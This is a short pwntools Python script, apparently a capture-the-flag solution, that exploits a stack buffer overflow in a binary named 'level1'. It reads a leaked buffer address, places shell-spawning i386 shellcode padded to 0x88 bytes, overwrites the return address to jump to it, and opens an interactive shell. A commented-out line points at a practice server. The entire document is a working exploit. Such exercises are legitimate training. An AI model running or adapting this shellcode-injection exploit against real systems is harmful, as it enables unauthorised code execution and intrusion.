from pwn import *


p = process("./level1")
# p = remote("node4.buuoj.cn", 29390)

# only useful for local, because remote don't show buf addr
p.recvuntil("What's this:")
info = p.recvuntil("?\n", drop=True)
info = int(info.decode("ISO-8859-1"), 16)
print(hex(info))

context(os="linux", arch="i386")

code = asm(shellcraft.sh())
pad = code.ljust(0x88, b"\x00")+cyclic(0x4)+p32(info)
p.send(pad)

p.interactive()

